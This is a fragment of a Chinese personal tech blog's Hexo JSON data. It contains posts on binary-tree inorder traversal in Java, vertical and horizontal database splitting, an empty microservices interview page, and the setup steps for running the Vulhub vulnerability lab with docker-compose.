title=\"中序遍历\"></a>中序遍历</h3><p>前序遍历即根节点在前： 左 -&gt; 根 -&gt; 右  4-2-5-1-6-3</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrder</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tinOrder(root.left);</span><br><span class=\"line\">\tSystem.out.println(root.data);</span><br><span class=\"line\">\tinOrder(root.right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 非递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrder01</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"微服务面试题","date":"2018-11-02T03:26:34.000Z","_content":"\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/微服务面试题.md","raw":"---\ntitle: 微服务面试题\ndate: 2018-11-02 11:26:34\ntags:\ncategories:\n---\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"微服务面试题","published":1,"updated":"2019-06-26T03:52:03.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gm0012o25t8sozb3yt","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"数据库拆分","date":"2018-11-26T09:30:10.000Z","_content":"\n\n### 一、数据库的拆分\n\n当数据库的数据量非常大时，**水平拆分**和**垂直拆分**是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。\n\n假设我们在数据库中有用户表\n```sql\ncreate table user(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\tsign varchar(64),\n\tintro varchar(256)\n\t...\n)engine=innodb charset=utf8;\n```\n\n**水平拆分**是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：\n\t（1）每个库（表）的结构都一样\n\t（2）每个库（表）的数据不一样，没有交集\n\t（3）所有库（表）的并集是全量数据\n\n\n**垂直拆分**是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：\n\t（1）每个库（表）的结构都不一样\n\t（2）一般来说每个库（表）的属性至少有一列交集，一般是主键\n\t（3）所有库（表）的数据并集是全量数据\n\n以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：\n\n```sql\ncreate table user_base(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\t...\n)\n\ncreate table user_ext(\n\tid bigint,\n\tsign varchar(64),\n\tintro varchar(256),\n\t...\n)\n```\n\n从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。\n\n\n### 二、垂直拆分的依据是什么\n\n那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：\n（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表\n（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表\n（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里\n\n优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。\n\n一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，**当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。**\n\n原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。\n（1）join更消耗数据库性能\n（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。\n\n\n### 三、为什么要这样拆分\n\n为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：\n（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里\n（2）内存buffer缓存数据是以row为单位的\n（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据\n（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO\n\n还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：\n（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据\n（2）user_ext访问频率低，一行大小0.9k\n拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。\n\n\n### 四、总结\n\n1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段\n2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性\n3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/数据库拆分.md","raw":"---\ntitle: 数据库拆分\ndate: 2018-11-26 17:30:10\ntags: ['分布式', '数据库拆分', '大数据']\ncategories: 架构\n---\n\n\n### 一、数据库的拆分\n\n当数据库的数据量非常大时，**水平拆分**和**垂直拆分**是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。\n\n假设我们在数据库中有用户表\n```sql\ncreate table user(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\tsign varchar(64),\n\tintro varchar(256)\n\t...\n)engine=innodb charset=utf8;\n```\n\n**水平拆分**是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：\n\t（1）每个库（表）的结构都一样\n\t（2）每个库（表）的数据不一样，没有交集\n\t（3）所有库（表）的并集是全量数据\n\n\n**垂直拆分**是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：\n\t（1）每个库（表）的结构都不一样\n\t（2）一般来说每个库（表）的属性至少有一列交集，一般是主键\n\t（3）所有库（表）的数据并集是全量数据\n\n以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：\n\n```sql\ncreate table user_base(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\t...\n)\n\ncreate table user_ext(\n\tid bigint,\n\tsign varchar(64),\n\tintro varchar(256),\n\t...\n)\n```\n\n从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。\n\n\n### 二、垂直拆分的依据是什么\n\n那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：\n（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表\n（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表\n（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里\n\n优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。\n\n一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，**当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。**\n\n原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。\n（1）join更消耗数据库性能\n（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。\n\n\n### 三、为什么要这样拆分\n\n为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：\n（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里\n（2）内存buffer缓存数据是以row为单位的\n（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据\n（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO\n\n还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：\n（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据\n（2）user_ext访问频率低，一行大小0.9k\n拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。\n\n\n### 四、总结\n\n1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段\n2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性\n3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"数据库拆分","published":1,"updated":"2019-06-26T03:52:03.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gn0014o25tfgudood3","content":"<h3 id=\"一、数据库的拆分\"><a href=\"#一、数据库的拆分\" class=\"headerlink\" title=\"一、数据库的拆分\"></a>一、数据库的拆分</h3><p>当数据库的数据量非常大时，<strong>水平拆分</strong>和<strong>垂直拆分</strong>是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。</p>\n<p>假设我们在数据库中有用户表<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">user</span>(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)<span class=\"keyword\">engine</span>=<span class=\"keyword\">innodb</span> <span class=\"keyword\">charset</span>=utf8;</span><br></pre></td></tr></table></figure></p>\n<p><strong>水平拆分</strong>是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：<br>    （1）每个库（表）的结构都一样<br>    （2）每个库（表）的数据不一样，没有交集<br>    （3）所有库（表）的并集是全量数据</p>\n<p><strong>垂直拆分</strong>是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：<br>    （1）每个库（表）的结构都不一样<br>    （2）一般来说每个库（表）的属性至少有一列交集，一般是主键<br>    （3）所有库（表）的数据并集是全量数据</p>\n<p>以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_base(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_ext(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。</p>\n<h3 id=\"二、垂直拆分的依据是什么\"><a href=\"#二、垂直拆分的依据是什么\" class=\"headerlink\" title=\"二、垂直拆分的依据是什么\"></a>二、垂直拆分的依据是什么</h3><p>那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：<br>（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表<br>（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表<br>（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里</p>\n<p>优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。</p>\n<p>一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，<strong>当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。</strong></p>\n<p>原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。<br>（1）join更消耗数据库性能<br>（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。</p>\n<h3 id=\"三、为什么要这样拆分\"><a href=\"#三、为什么要这样拆分\" class=\"headerlink\" title=\"三、为什么要这样拆分\"></a>三、为什么要这样拆分</h3><p>为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：<br>（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里<br>（2）内存buffer缓存数据是以row为单位的<br>（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据<br>（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO</p>\n<p>还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：<br>（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据<br>（2）user_ext访问频率低，一行大小0.9k<br>拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><p>1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段<br>2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性<br>3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一、数据库的拆分\"><a href=\"#一、数据库的拆分\" class=\"headerlink\" title=\"一、数据库的拆分\"></a>一、数据库的拆分</h3><p>当数据库的数据量非常大时，<strong>水平拆分</strong>和<strong>垂直拆分</strong>是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。</p>\n<p>假设我们在数据库中有用户表<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">user</span>(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)<span class=\"keyword\">engine</span>=<span class=\"keyword\">innodb</span> <span class=\"keyword\">charset</span>=utf8;</span><br></pre></td></tr></table></figure></p>\n<p><strong>水平拆分</strong>是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：<br>    （1）每个库（表）的结构都一样<br>    （2）每个库（表）的数据不一样，没有交集<br>    （3）所有库（表）的并集是全量数据</p>\n<p><strong>垂直拆分</strong>是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：<br>    （1）每个库（表）的结构都不一样<br>    （2）一般来说每个库（表）的属性至少有一列交集，一般是主键<br>    （3）所有库（表）的数据并集是全量数据</p>\n<p>以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_base(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_ext(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。</p>\n<h3 id=\"二、垂直拆分的依据是什么\"><a href=\"#二、垂直拆分的依据是什么\" class=\"headerlink\" title=\"二、垂直拆分的依据是什么\"></a>二、垂直拆分的依据是什么</h3><p>那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：<br>（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表<br>（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表<br>（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里</p>\n<p>优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。</p>\n<p>一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，<strong>当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。</strong></p>\n<p>原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。<br>（1）join更消耗数据库性能<br>（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。</p>\n<h3 id=\"三、为什么要这样拆分\"><a href=\"#三、为什么要这样拆分\" class=\"headerlink\" title=\"三、为什么要这样拆分\"></a>三、为什么要这样拆分</h3><p>为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：<br>（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里<br>（2）内存buffer缓存数据是以row为单位的<br>（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据<br>（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO</p>\n<p>还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：<br>（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据<br>（2）user_ext访问频率低，一行大小0.9k<br>拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><p>1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段<br>2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性<br>3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"漏洞靶场Vulhub使用","date":"2018-11-01T09:36:18.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\nVulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 安装\n{% endnote %}\n</div>\n\n我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装\n\n```bash\n# 安装git\nyum install git\n# 安装docker并启动docker\nyum install docker && systemctl start docker\n# 安装docker-compose\nyum install docker-compose\n```\n\n由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。\n\ndocker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行`docker-compose up -d`即可启动容器环境。\n\n安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录\n\n```bash\ngit clone https://github.com/vulhub/vulhub.git\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 启动漏洞环境\n{% endnote %}\n</div>\n\ndocker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。\n\n在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入`flask/ssti`目录，执行如下命令，进行漏洞靶场的编译和运行：\n```bash\ncd flask/ssti\ndocker-compose build\ndocker-compose up -d\n```\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     